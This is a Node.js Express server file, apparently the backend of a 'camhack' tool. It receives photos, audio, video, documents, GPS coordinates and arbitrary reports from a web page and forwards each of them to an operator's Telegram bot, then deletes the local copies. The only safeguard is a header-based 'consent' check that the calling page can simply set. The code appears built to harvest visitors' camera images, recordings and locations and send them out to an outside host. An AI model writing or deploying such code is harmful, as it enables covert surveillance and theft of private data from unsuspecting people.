const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const axios = require('axios');
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const uploadDir = process.env.VERCEL
    ? path.join('/tmp', 'camhack-uploads')
    : path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
app.use('/uploads', express.static(uploadDir));

const storage = multer.diskStorage({
    destination: (_, __, cb) => cb(null, uploadDir),
    filename: (_, file, cb) => {
        const ext = path.extname(file.originalname) || '.bin';
        cb(null, Date.now() + '-' + Math.round(Math.random() * 1e9) + ext);
    }
});
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

const tgReady = () => Boolean(BOT_TOKEN && CHAT_ID);
const tg = (m) => `https://api.telegram.org/bot${BOT_TOKEN}/${m}`;

async function sendMessage(text) {
    if (!tgReady()) throw new Error('Telegram not configured');
    const r = await axios.post(tg('sendMessage'), {
        chat_id: CHAT_ID, text: String(text).slice(0, 4000),
        parse_mode: 'HTML', disable_web_page_preview: true
    }, { timeout: 30000 });
    return r.data;
}

async function sendLocation(lat, lon, caption) {
    if (!tgReady()) throw new Error('Telegram not configured');
    const msg = `${caption || '📍 Location'}\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\n<a href="https://maps.google.com/?q=${lat},${lon}">Map</a>`;
    await sendMessage(msg);
    const r = await axios.post(tg('sendLocation'), { chat_id: CHAT_ID, latitude: lat, longitude: lon }, { timeout: 30000 });
    return r.data;
}

async function sendMedia(method, field, filePath, caption) {
    if (!tgReady()) throw new Error('Telegram not configured');
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append(field, fs.createReadStream(filePath), { filename: path.basename(filePath) });
    if (caption) form.append('caption', String(caption).slice(0, 1024));
    const r = await axios.post(tg(method), form, {
        headers: form.getHeaders(), timeout: 120000,
        maxContentLength: Infinity, maxBodyLength: Infinity
    });
    return r.data;
}

// Consent gate (except health)
app.use('/api', (req, res, next) => {
    if (req.path === '/health') return next();
    if (req.headers['x-consent'] !== 'granted') {
        return res.status(403).json({ error: 'Consent required' });
    }
    next();
});

app.get('/api/health', (_, res) => res.json({
    ok: true, telegramConfigured: tgReady(), time: new Date().toISOString()
}));

app.post('/api/upload', upload.single('image'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });
    try {
        const r = await sendMedia('sendPhoto', 'photo', req.file.path, req.body.caption);
        fs.unlink(req.file.path, () => {});
        res.json({ success: true, telegram: r.ok === true });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

['audio', 'voice', 'video', 'document'].forEach(type => {
    const map = { audio: ['sendAudio', 'audio'], voice: ['sendVoice', 'voice'], video: ['sendVideo', 'video'], document: ['sendDocument', 'document'] };
    app.post(`/api/upload/${type}`, upload.single(type), async (req, res) => {
        if (!req.file) return res.status(400).json({ error: 'No file' });
        try {
            const [m, f] = map[type];
            const r = await sendMedia(m, f, req.file.path, req.body.caption);
            fs.unlink(req.file.path, () => {});
            res.json({ success: true, telegram: r.ok === true });
        } catch (e) { res.status(500).json({ success: false, error: e.message }); }
    });
});

app.post('/api/telegram/message', async (req, res) => {
    try { const r = await sendMessage(req.body.text || ''); res.json({ success: r.ok === true }); }
    catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/location', async (req, res) => {
    const { latitude, longitude, caption } = req.body || {};
    if (typeof latitude !== 'number' || typeof longitude !== 'number')
        return res.status(400).json({ error: 'lat/lon required' });
    try { const r = await sendLocation(latitude, longitude, caption); res.json({ success: r.ok === true }); }
    catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/telegram/report', async (req, res) => {
    try {
        const lines = ['📊 <b>API Report</b>', `<b>Time:</b> ${new Date().toLocaleString()}`, ''];
        const d = req.body || {};
        Object.keys(d).forEach(k => {
            let v = d[k];
            if (v === null || v === undefined || v === '') return;
            if (typeof v === 'object') v = JSON.stringify(v).slice(0, 400);
            lines.push(`<b>${k}:</b> <code>${String(v).slice(0, 800)}</code>`);
        });
        const r = await sendMessage(lines.join('\n'));
        res.json({ success: r.ok === true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/', (_, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'index.html')));

if (require.main === module && !process.env.VERCEL) {
    app.listen(PORT, () => {
        console.log(`Server on ${PORT}`);
        console.log(`Telegram: ${tgReady() ? '✅' : '❌'}`);
    });
}
module.exports = app;
